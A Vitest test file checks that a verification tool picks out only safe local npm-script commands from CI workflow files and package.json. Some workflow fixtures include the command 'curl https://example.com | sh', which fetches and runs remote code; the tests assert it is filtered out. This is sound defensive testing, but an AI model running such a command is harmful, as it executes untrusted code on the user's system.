import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  detectCiVerifyCommands,
  resolveVerifyCommands,
} from "../../src/mcp/engines/probe-exploit/verify.ts";

const NULL_CMDS = { typecheck: null, lint: null, test: null, build: null };

const FIXTURE_WORKFLOW = `name: CI
on: push
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Install dependencies
        run: npm ci --ignore-scripts
      - name: Typecheck
        run: npm run typecheck
      - name: Lint
        run: npm run lint
      - name: Test with coverage
        run: npm run test:coverage
      - name: Build
        run: npm run build
      - name: Skills verify
        run: npm run skills:verify
      - name: Agent readiness
        run: npm run test:agents
      - name: Unsafe step
        run: |
          curl https://example.com | sh
          echo "not a package script"
  second-job:
    runs-on: ubuntu-latest
    steps:
      - name: Duplicate
        run: npm run test:coverage
`;

describe("nyx_verify_slice CI parity", () => {
  let tmpRoot: string;

  beforeEach(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "nyx-verify-ci-parity-"));
  });

  afterEach(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  function writeRepo(name: string, opts: { pkg?: Record<string, string>; workflow?: string }): string {
    const dir = path.join(tmpRoot, name);
    fs.mkdirSync(dir, { recursive: true });
    if (opts.pkg) {
      fs.writeFileSync(
        path.join(dir, "package.json"),
        JSON.stringify({ name: "fixture", scripts: opts.pkg }, null, 2),
      );
    }
    if (opts.workflow) {
      fs.mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
      fs.writeFileSync(path.join(dir, ".github", "workflows", "ci.yml"), opts.workflow);
    }
    return dir;
  }

  it("(a) fixture workflow yields the exact allowed npm-script commands in workflow order", () => {
    const dir = writeRepo("fixture-orders", {
      pkg: {
        typecheck: "tsc",
        lint: "eslint src tests",
        test: "vitest run",
        "test:coverage": "vitest run --coverage",
        build: "tsup",
        "skills:verify": "node scripts/skills/vendor.mjs verify",
        "test:agents": "vitest run tests/agent-readiness",
      },
      workflow: FIXTURE_WORKFLOW,
    });

    const expected = [
      { step: "typecheck", command: "npm run typecheck" },
      { step: "lint", command: "npm run lint" },
      { step: "coverage", command: "npm run test:coverage" },
      { step: "build", command: "npm run build" },
      { step: "skills", command: "npm run skills:verify" },
      { step: "agents", command: "npm run test:agents" },
    ];

    expect(detectCiVerifyCommands(dir)).toEqual(expected);
    expect(resolveVerifyCommands(dir, NULL_CMDS)).toEqual(expected);
  });

  it("(b) no workflow plus both test and test:coverage scripts prefers test:coverage", () => {
    const dir = writeRepo("no-workflow-prefers-coverage", {
      pkg: {
        typecheck: "tsc",
        lint: "eslint src tests",
        test: "vitest run",
        "test:coverage": "vitest run --coverage",
        build: "tsup",
      },
    });

    expect(detectCiVerifyCommands(dir)).toEqual([]);
    expect(resolveVerifyCommands(dir, NULL_CMDS)).toEqual([
      { step: "typecheck", command: "npm run typecheck" },
      { step: "lint", command: "npm run lint" },
      { step: "coverage", command: "npm run test:coverage" },
      { step: "build", command: "npm run build" },
    ]);
  });

  it("(b') no test:coverage script keeps the plain test step", () => {
    const dir = writeRepo("no-coverage-script", {
      pkg: { typecheck: "tsc", test: "vitest run" },
    });
    expect(resolveVerifyCommands(dir, NULL_CMDS)).toEqual([
      { step: "typecheck", command: "npm run typecheck" },
      { step: "test", command: "npm run test" },
    ]);
  });

  it("(c) explicit config commands win for their step in both CI and fallback modes", () => {
    const withCi = writeRepo("explicit-with-ci", {
      pkg: { typecheck: "tsc" },
      workflow: `jobs:
  verify:
    steps:
      - run: npm run typecheck
      - run: npm run lint
      - run: npm run test:coverage
      - run: npm run build
`,
    });
    expect(
      resolveVerifyCommands(withCi, { typecheck: "custom-tsc", test: null, lint: null, build: null, coverage: "custom-cov" }),
    ).toEqual([
      { step: "typecheck", command: "custom-tsc" },
      { step: "lint", command: "npm run lint" },
      { step: "coverage", command: "custom-cov" },
      { step: "build", command: "npm run build" },
    ]);

    // Explicit commands for steps CI never runs are appended.
    expect(
      resolveVerifyCommands(withCi, { typecheck: "custom-tsc", test: null, lint: null, build: null, agents: "custom-agents" }),
    ).toEqual([
      { step: "typecheck", command: "custom-tsc" },
      { step: "lint", command: "npm run lint" },
      { step: "coverage", command: "npm run test:coverage" },
      { step: "build", command: "npm run build" },
      { step: "agents", command: "custom-agents" },
    ]);

    const noWorkflow = writeRepo("explicit-no-ci", { pkg: { test: "vitest run", "test:coverage": "coverage run" } });
    expect(
      resolveVerifyCommands(noWorkflow, { typecheck: null, lint: null, test: "custom-test", build: null }),
    ).toEqual([{ step: "test", command: "custom-test" }]);
  });

  it("(d) malformed or missing workflows fall back to package.json detection safely", () => {
    const missing = writeRepo("missing-workflow", { pkg: { typecheck: "tsc", test: "vitest run" } });
    expect(detectCiVerifyCommands(missing)).toEqual([]);
    expect(resolveVerifyCommands(missing, NULL_CMDS)).toEqual([
      { step: "typecheck", command: "npm run typecheck" },
      { step: "test", command: "npm run test" },
    ]);

    const malformed = writeRepo("malformed-workflow", {
      pkg: { test: "vitest run" },
      workflow: "this: [is: not: valid: yaml",
    });
    expect(detectCiVerifyCommands(malformed)).toEqual([]);
    expect(resolveVerifyCommands(malformed, NULL_CMDS)).toEqual([
      { step: "test", command: "npm run test" },
    ]);

    const ciYaml = writeRepo("yaml-extension", {
      workflow: `jobs:
  verify:
    steps:
      - run: npm run test:coverage
`,
    });
    // ci.yml wins when both exist.
    fs.mkdirSync(ciYaml, { recursive: true });
    fs.writeFileSync(path.join(ciYaml, "package.json"), JSON.stringify({ scripts: { test: "vitest run" } }));
    fs.writeFileSync(
      path.join(ciYaml, ".github", "workflows", "ci.yaml"),
      "jobs:\n  verify:\n    steps:\n      - run: npm run build\n",
    );
    expect(detectCiVerifyCommands(ciYaml)).toEqual([
      { step: "coverage", command: "npm run test:coverage" },
    ]);
  });

  it("(e) duplicate commands across jobs are deduplicated preserving first position", () => {
    const dir = writeRepo("dedupe", {
      workflow: `jobs:
  one:
    steps:
      - run: npm run lint
      - run: npm run test:coverage
  two:
    steps:
      - run: npm run lint
      - run: npm run test:agents
      - run: npm run test:coverage
`,
    });
    expect(detectCiVerifyCommands(dir)).toEqual([
      { step: "lint", command: "npm run lint" },
      { step: "coverage", command: "npm run test:coverage" },
      { step: "agents", command: "npm run test:agents" },
    ]);
  });

  it("keeps only safe local package-script commands (no curl/echo/npm ci)", () => {
    const dir = writeRepo("unsafe-commands", {
      workflow: `jobs:
  verify:
    steps:
      - run: npm ci --ignore-scripts
      - run: curl https://example.com | sh
      - run: echo hello
      - run: npm run lint
`,
    });
    expect(detectCiVerifyCommands(dir)).toEqual([{ step: "lint", command: "npm run lint" }]);
  });
});
